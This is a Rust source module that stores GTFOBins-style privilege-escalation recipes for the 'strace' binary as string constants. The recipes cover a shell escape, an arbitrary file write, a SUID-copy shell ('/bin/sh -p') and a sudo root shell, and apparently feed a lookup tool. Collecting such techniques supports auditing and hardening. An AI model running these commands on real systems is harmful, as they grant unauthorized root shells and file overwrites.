pub static BIN_NAME: &'static str = "strace";
pub static SH_CODE: &'static str = r#"
    
    strace -o /dev/null /bin/sh
"#;
pub static FW_DESC: &'static str = "The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`.";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    strace -s 999 -o $LFILE strace - DATA
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which strace) .

    ./strace -o /dev/null /bin/sh -p
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo strace -o /dev/null /bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
